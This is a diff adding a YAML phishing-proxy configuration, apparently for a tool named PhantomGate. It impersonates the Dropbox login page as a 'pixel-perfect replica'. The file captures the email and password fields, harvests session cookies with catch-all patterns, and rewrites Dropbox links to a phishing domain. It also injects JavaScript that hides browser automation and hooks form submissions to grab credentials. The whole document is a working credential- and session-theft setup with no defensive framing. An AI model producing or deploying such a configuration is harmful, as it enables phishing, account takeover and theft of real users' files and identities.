@@ -1,0 +1,65 @@
+name: Dropbox
+author: PhantomGate
+version: 2.0.0
+description: Dropbox authentication - Pixel-perfect replica
+
+auth:
+  domains:
+    - dropbox.com
+    - www.dropbox.com
+    - account.dropbox.com
+  
+  login:
+    domain: www.dropbox.com
+    path: /login
+    username:
+      selector: "input#regular-email-input"
+      capture: true
+    password:
+      selector: "input#regular-password-input"
+      capture: true
+  
+  tokens:
+    cookies:
+      - name: lid
+        regex: ".*"
+      - name: tk
+        regex: ".*"
+      - name: g_email
+        regex: ".*"
+      - name: g_pwd
+        regex: ".*"
+      - name: __Host-js_csrf
+        regex: ".*"
+
+proxy:
+  hosts:
+    - domain: dropbox.com
+      inject: true
+    - domain: www.dropbox.com
+      inject: true
+  
+  sub_filters:
+    - domain: dropbox.com
+      search: "https://www.dropbox.com"
+      replace: "https://{phishing_domain}"
+
+injection:
+  js: |
+    // PhantomGate Injection - Dropbox
+    (function() {
+      'use strict';
+      
+      // Override navigator properties
+      Object.defineProperty(navigator, 'webdriver', {get: () => false});
+      
+      // Capture form submissions
+      document.addEventListener('submit', function(e) {
+        var form = e.target;
+        var username = form.querySelector('#regular-email-input');
+        var password = form.querySelector('#regular-password-input');
+        if (username && password) {
+          console.log('[PhantomGate] Dropbox credentials captured');
+        }
+      }, true);
+    })();
